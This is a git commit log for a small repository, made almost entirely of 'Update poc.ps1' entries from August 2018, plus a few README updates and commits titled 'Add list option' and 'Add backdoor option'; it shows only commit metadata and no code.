+    Update poc.ps1
+
+commit 2353e8d7d2a37c590fce94889e4af51219b0b09e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 11:00:42 2018 +0200
+
+    Update poc.ps1
+
+commit 40c8389e5f0e2cca772e0760c82adc127fe4fe0e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 10:31:59 2018 +0200
+
+    Update poc.ps1
+
+commit 0255e9461a0f2dae637f48eb53d87a3905b4691c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 10:23:31 2018 +0200
+
+    Update poc.ps1
+
+commit 98fdf980a14414a698b1a79cf5a54007652ed329
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 10:19:06 2018 +0200
+
+    Update poc.ps1
+
+commit 8780b779a01a7ce57a70ac407bd1966a0e3c8454
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 09:59:29 2018 +0200
+
+    Update poc.ps1
+
+commit e03bfe9eb8651e71bceb8b182aad16afec7681d4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 20 09:54:59 2018 +0200
+
+    Update poc.ps1
+
+commit 497414026fde544359ab1bf5444e29441befa472
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 15:26:36 2018 +0200
+
+    Update poc.ps1
+
+commit e00a52a0f26a3f79e334e96c1442991f305a9dbd
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 14:08:59 2018 +0200
+
+    Update poc.ps1
+
+commit d3be08b3506e016937b5311ba0f2966ab4b7f498
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 13:52:35 2018 +0200
+
+    Update poc.ps1
+
+commit 2ad40f71aaa9b543fe8cda43da6980cd50f881ce
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 13:48:41 2018 +0200
+
+    Update poc.ps1
+
+commit 7e62293c7c1f5d082c2414c0775bdcc1d319079b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 13:36:04 2018 +0200
+
+    Update README.md
+
+commit 1bbaf0624128ff3e91bf9111d86b5d08739a88ab
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 13:31:35 2018 +0200
+
+    Update poc.ps1
+
+commit a1b15794bdc699563ce7c1fc05591ce446f52714
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 11:08:08 2018 +0200
+
+    Update poc.ps1
+
+commit 991e6c7ea6966a01979d90b2049a37507ea29ad6
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Fri Aug 17 10:40:45 2018 +0200
+
+    Update poc.ps1
+
+commit a59580357416ecfb06f7971cd2ce7ddfc35b65ce
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 14:10:07 2018 +0200
+
+    Update poc.ps1
+
+commit 407deb02076ef028065ef12deb18ffd917e38592
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 14:06:37 2018 +0200
+
+    Update poc.ps1
+
+commit 481074a85a765c442d91e5bcaaf9378cec25130d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:57:06 2018 +0200
+
+    Update poc.ps1
+
+commit d8738aa6404086568f9d7d26d33f9f01b50fce00
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:55:56 2018 +0200
+
+    Update poc.ps1
+
+commit 0b12406c72c4f5d37bfa47137409dd24346f5127
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:54:00 2018 +0200
+
+    Update poc.ps1
+
+commit 3d347d22d603c4ba0bff823de5322f9ef97e6c31
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:52:47 2018 +0200
+
+    Update poc.ps1
+
+commit bac177b26dc303bb0b1270beb8665ad3d8b04f64
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:44:34 2018 +0200
+
+    Update poc.ps1
+
+commit 2ac98ab7ee7502b091cc3d6b2db1ecbec82026d5
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:33:54 2018 +0200
+
+    Update poc.ps1
+
+commit 1047b9864fb2a43c12aedda500258076f30cb36c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:30:57 2018 +0200
+
+    Update poc.ps1
+
+commit 5716640645d1754042b4bb08b80dde89b2fa565a
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:26:17 2018 +0200
+
+    Update poc.ps1
+
+commit c096f45018e3ac385b8cf36eef97cde56a37e435
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 12:24:22 2018 +0200
+
+    Update poc.ps1
+
+commit 232ec266e96041abfb332d2cbb4dcf3ca3f1997d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 11:15:23 2018 +0200
+
+    Update poc.ps1
+
+commit dada62ddce88a0b68494c86d33609691eba291ec
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 11:13:49 2018 +0200
+
+    Update poc.ps1
+
+commit ca95cd310d1a592177101dcb082f98c955b5166c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 11:11:03 2018 +0200
+
+    Update poc.ps1
+
+commit e37fe8e5309244a9325c6d6510cc4a1b54fc6509
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 11:08:53 2018 +0200
+
+    Update poc.ps1
+
+commit a1e31d8a3814f8bdb8c7b54f29500101aa9d8ea2
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 11:04:56 2018 +0200
+
+    Update poc.ps1
+
+commit 5c6c6dc5a14ef9d2a17a90d2346effb19e1eb76e
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Thu Aug 16 10:55:16 2018 +0200
+
+    Add backdoor option
+
+commit 21b409ee63040f824de6512608eb38eeda8ad92b
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 14 19:14:22 2018 +0200
+
+    Update poc.ps1
+
+commit d6961bac47986b3e047cd9468de4639b9f9a45d0
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 14 13:32:38 2018 +0200
+
+    Update poc.ps1
+
+commit d73230535bb9f82cacecc5bb120f6ff1a09d7ba8
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Tue Aug 14 09:52:07 2018 +0200
+
+    Update README.md
+
+commit 90f1e6018249f09c4ef8626d363e7935f316acd4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:58:31 2018 +0200
+
+    Update poc.ps1
+
+commit a6f5b4317759810fceb52ca991285302cdf6e6b6
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:54:46 2018 +0200
+
+    Update poc.ps1
+
+commit d2e813179fc47904dae7102ec97b8d272700075c
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:53:17 2018 +0200
+
+    Add list option
+
+commit 5c8838bedb7fad73d7961bde9b1154e00ac916f2
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:49:06 2018 +0200
+
+    Update poc.ps1
+
+commit 8f1b074eb2e8fa51b816cece5f7ae883e6079b2d
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:47:50 2018 +0200
+
+    Update poc.ps1
+
+commit 04586f255b9ddc3232314baa4d918d1f0f1475d4
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:43:18 2018 +0200
+
+    Add files via upload
+
+commit be35cb7270868595e179a41c1b9bab4c43c15552
+Author: Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
+Date:   Mon Aug 13 13:42:24 2018 +0200
+
+    Initial commit
